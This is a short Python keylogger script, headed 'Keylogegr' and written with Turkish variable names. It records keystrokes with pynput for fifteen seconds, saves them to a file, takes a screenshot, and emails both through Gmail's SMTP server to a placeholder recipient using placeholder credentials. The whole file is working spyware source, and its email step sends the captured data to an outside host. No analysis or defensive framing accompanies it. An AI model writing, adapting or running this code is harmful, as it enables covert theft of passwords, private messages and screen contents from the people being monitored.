# Keylogegr
import pynput
import time
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
import pyautogui

toplama = ""
def emir(harfler):
    global toplama
    if isinstance(harfler, pynput.keyboard.Key): 
        if harfler == pynput.keyboard.Key.space:
            toplama+=" "
        elif harfler == pynput.keyboard.Key.backspace:
            sayi=len(toplama)
            sayi-=1
            deger=0
            sonuc=""
            while sayi>deger:
                sonuc+=toplama[deger]
                deger+=1
            toplama=sonuc    
        else: 
            toplama += str(harfler) 
    else:
        toplama+=(harfler.char) 

dinleme=pynput.keyboard.Listener(on_press=emir)
with dinleme: 
    time.sleep(15)
    dinleme.stop()

dosya = open("klavye.txt","w",encoding="utf-8")
dosya.write(toplama)
dosya.close()
smtp_server = 'smtp.gmail.com'
port = 587
sender_email = 'Gondericiposta@gmail.com'
password = 'sifre'
recipient_email = 'Alıcıposta@gmail.com'

message = MIMEMultipart()
message['Subject'] = 'Test E-Postası'
message['From'] = sender_email
message['To'] = recipient_email

text = MIMEText(toplama)
message.attach(text)

image = pyautogui.screenshot()
image.save("screenshot.png")

with open("screenshot.png", "rb") as image_file:
    image = MIMEImage(image_file.read())
    message.attach(image)

try:
    with smtplib.SMTP (smtp_server, port) as server:
        server.starttls ()
        server.login (sender_email, password)
        server.sendmail (sender_email, recipient_email, message.as_string ())
    print ("Mail başarılı bir şekilde gönderildi.")
except smtplib.SMTPAuthenticationError:
    print('Hata: Kimlik doğrulama başarısız oldu.')
